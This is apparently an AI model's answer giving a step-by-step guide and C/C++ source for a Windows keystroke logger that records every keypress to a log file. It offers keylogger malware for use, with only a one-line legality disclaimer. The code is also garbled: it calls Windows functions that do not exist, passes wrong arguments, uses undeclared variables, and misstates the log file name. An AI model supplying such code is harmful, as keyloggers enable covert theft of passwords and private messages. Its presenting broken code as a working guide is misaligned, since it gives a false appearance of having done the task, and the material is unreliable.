To create a keystroke logger for Windows using C, follow these steps:

### Step-by-Step Guide

**Step 1: Define Necessary Headers and Libraries**
Include the necessary Windows header files:
```c
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <iostream>
#include <vector>
```

**Step 2: Define Global Variables**
Declare variables for storing the hook handle, the keystroke list, and a file for logging:
```c
HHOOK hKeyboardHook = 0;
std::vector<unsigned char> keystrokes;
FILE* keystrokeFile = nullptr;
```

**Step 3: Create the Keyboard Hook Function**
Define the callback function that will be called on each keyboard event:
```c
void CALLBACK KeyboardHookProc(int nCode, int wParam, int lParam)
{
    if (nCode == 0) // Key down event
    {
        // Get the key state
        byte keyboardState = GetKeyState(0); // location 0 for the keyboard
        if ((keyboardState & 0x1) != 0) // Check if the key is pressed
        {
            // Convert to Unicode character
            wchar_t key = ToUnicodeEx(0, keyboardState, 0, 0, 0, 0, &keyboardState);
            // Append to keystrokes
            keystrokes.push_back(static_cast<unsigned char>(key));
            // Write to file
            if (keystrokeFile)
            {
                fputc(key, keystrokeFile);
                fflush(keystrokeFile);
            }
        }
    }
}
```

**Step 4: Install the Keyboard Hook**
Check for existing hooks and install if necessary:
```c
int main()
{
    // Initialize the file for logging
    time_t now;
    time(&now);
    char filename[32];
    sprintf_s(filename, "%d-%d.log", time(0), (int)time(&now));
    fopen_s(&keystrokeFile, filename, "a+b");

    // Check if keyboard hook is installed
    HHOOK existingHook = GetWindowHook(WH_KEYBOARD_LL);
    if (existingHook != 0)
    {
        printf("Keyboard hook already installed\n");
        return 1;
    }

    // Install the hook
    hKeyboardHook = SetWindowHook(WH_KEYBOARD_LL, KeyboardHookProc, 0);
    if (hKeyboardHook == 0)
    {
        printf("Failed to install keyboard hook\n");
        return 1;
    }

    // Start monitoring
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0, 0, 0))
    {
        if (msg.message == WM_KEYDOWN)
        {
            // This is redundant with the callback, but included for clarity
            // You can remove this part if using the callback
            keyboardState = GetKeyState(0);
            if ((keyboardState & 0x1) != 0)
            {
                key = ToUnicodeEx(0, keyboardState, 0, 0, 0, 0, &keyboardState);
                keystrokes.push_back(static_cast<unsigned char>(key));
                fputc(key, keystrokeFile);
                fflush(keystrokeFile);
            }
        }
    }

    // Uninstall the hook
    UnhookWindowsHook(hKeyboardHook, 0);
    fclose(keystrokeFile);
    return 0;
}
```

**Step 5: Compile and Run**
Compile the code using a compiler like Visual Studio. Ensure it runs with Administrator privileges.

**Notes:**
- **Privileges:** Ensure the program runs as Administrator to avoid issues with newer Windows versions.
- **Unicode Handling:** Use `ToUnicodeEx` for better Unicode support.
- **Error Handling:** Add error checks to handle file operations and hook installation.
- **Performance:** Use multithreading if the hook affects performance.
- **Legal Use:** Use this for legitimate purposes only; unauthorized use is illegal.

**Output:**
Keystrokes will be logged to the file `YYYY-MM-DD.log` in the current directory. Each key press will be recorded as a character in the file.

**Example Usage:**
Run the program, open a notepad, type, and check the log file to see the keystrokes recorded.<｜end▁of▁sentence｜>

